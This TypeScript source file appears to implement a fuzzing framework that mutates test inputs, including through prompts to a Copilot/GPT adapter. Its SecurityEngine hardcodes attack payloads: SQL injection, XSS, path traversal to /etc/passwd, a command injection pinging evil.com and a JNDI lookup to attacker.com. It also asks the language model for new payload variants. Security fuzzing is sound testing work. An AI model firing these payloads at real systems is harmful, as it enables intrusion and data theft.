/**
 * ===========================================================
 * MUTATION.TS
 * ===========================================================
 * Unified Dynamic Mutation Framework
 * - Adaptive fuzzing strategies (input, semantic, security)
 * - Copilot/GPT-assisted mutation engine
 * - Context-aware and self-learning via success feedback
 * ===========================================================
 */

export interface GeneratedTest {
    name: string;
    input: any;
    confidence?: number;
    metadata?: Record<string, any>;
}

export interface MutationContext {
    domain: "frontend" | "backend";
    language: "java" | "typescript" | "python" | "rust";
    lastError?: string;
    copilotAdapter?: CopilotAdapter;
}

export interface CopilotAdapter {
    generateMutation(prompt: string): Promise<string>;
}

export interface MutationStrategy {
    id: string;
    category: "input" | "semantic" | "security" | "performance" | "structural";
    description: string;
    probability: number;
    apply: (test: GeneratedTest, context: MutationContext) => Promise<GeneratedTest>;
}

// ===========================================================
// SECURITY ENGINE (dynamic payloads)
// ===========================================================

export class SecurityEngine {
    private patterns: {
        id: string;
        template: string;
        category: "injection" | "overflow" | "bypass" | "serialization";
        successRate: number;
    }[] = [
            { id: "sql_injection", template: "' OR '1'='1'; --", category: "injection", successRate: 1 },
            { id: "xss", template: "<script>alert('XSS')</script>", category: "injection", successRate: 1 },
            { id: "path_traversal", template: "../../etc/passwd", category: "bypass", successRate: 1 },
            { id: "command_injection", template: "&& ping -c 3 evil.com &&", category: "injection", successRate: 1 },
            { id: "jndi_exploit", template: "${jndi:ldap://attacker.com/exploit}", category: "serialization", successRate: 1 },
        ];

    async applyDynamicPayload(input: string, ctx: MutationContext): Promise<string> {
        const chosen = this.pickWeightedPattern();
        let payload = chosen.template;

        // 30% probabilità di generare payload dinamico con Copilot
        if (ctx.copilotAdapter && Math.random() < 0.3) {
            const prompt = `
Generate a new ${chosen.category} payload for ${ctx.language} (${ctx.domain}).
Base pattern: ${payload}
Last error: ${ctx.lastError || "none"}.
Keep same syntax, short output.`;
            try {
                const suggestion = await ctx.copilotAdapter.generateMutation(prompt);
                payload = suggestion.trim();
            } catch {
                /* fallback to static payload */
            }
        }

        return `${input}${payload}`;
    }

    updateSuccess(id: string, success: boolean) {
        const pattern = this.patterns.find((p) => p.id === id);
        if (pattern) pattern.successRate *= success ? 1.2 : 0.8;
    }

    private pickWeightedPattern() {
        const total = this.patterns.reduce((sum, p) => sum + p.successRate, 0);
        let r = Math.random() * total;
        for (const p of this.patterns) {
            if ((r -= p.successRate) <= 0) return p;
        }
        return this.patterns[0];
    }
}

// ===========================================================
// BASE MUTATION STRATEGIES
// ===========================================================

const securityEngine = new SecurityEngine();

export const MutationStrategies: MutationStrategy[] = [
    {
        id: "boundary_value",
        category: "input",
        description: "Boundary values and numeric edges",
        probability: 0.15,
        apply: async (test) => {
            const values = [0, 1, -1, Number.MAX_SAFE_INTEGER, Number.MIN_SAFE_INTEGER];
            return { ...test, input: values[Math.floor(Math.random() * values.length)] };
        },
    },
    {
        id: "type_flip",
        category: "semantic",
        description: "Change data type or logical inversion",
        probability: 0.1,
        apply: async (test) => {
            const v = test.input;
            if (typeof v === "boolean") return { ...test, input: !v };
            if (typeof v === "number") return { ...test, input: v.toString() };
            if (typeof v === "string") return { ...test, input: v.split("").reverse().join("") };
            return test;
        },
    },
    {
        id: "encoding_mutation",
        category: "input",
        description: "Apply Unicode/base64/escaped encoding",
        probability: 0.1,
        apply: async (test) => {
            const encoders = [
                (s: string) => Buffer.from(s).toString("base64"),
                (s: string) => encodeURIComponent(s),
                (s: string) => s.normalize("NFKD"),
            ];
            const fn = encoders[Math.floor(Math.random() * encoders.length)];
            return { ...test, input: fn(String(test.input)) };
        },
    },
    {
        id: "security_dynamic",
        category: "security",
        description: "Applies dynamic security payload (Copilot + weighted pattern)",
        probability: 0.15,
        apply: async (test, ctx) => {
            const newInput = await securityEngine.applyDynamicPayload(String(test.input), ctx);
            return { ...test, input: newInput, name: `${test.name}_sec` };
        },
    },
    {
        id: "copilot_dynamic",
        category: "semantic",
        description: "Delegates mutation logic to Copilot or GPT",
        probability: 0.1,
        apply: async (test, ctx) => {
            if (!ctx.copilotAdapter) return test;
            const prompt = `
You are a mutation generator improving test coverage.
Language: ${ctx.language}
Domain: ${ctx.domain}
Input: ${JSON.stringify(test.input)}
Generate a single mutated variant testing a new edge case.`;
            const suggestion = await ctx.copilotAdapter.generateMutation(prompt);
            return { ...test, input: suggestion.trim(), name: `${test.name}_copilot` };
        },
    },
];

// ===========================================================
// MUTATION REGISTRY
// ===========================================================

export class MutationRegistry {
    constructor(private domain: "frontend" | "backend" = "backend") { }

    async applyRandomMutation(
        test: GeneratedTest,
        ctx: MutationContext
    ): Promise<GeneratedTest> {
        const strategies = MutationStrategies.filter((s) =>
            this.domain === "backend" ? true : s.category !== "structural"
        );
        const total = strategies.reduce((sum, s) => sum + s.probability, 0);
        const r = Math.random() * total;

        let acc = 0;
        for (const s of strategies) {
            acc += s.probability;
            if (r <= acc) return s.apply(test, ctx);
        }

        return test;
    }
}
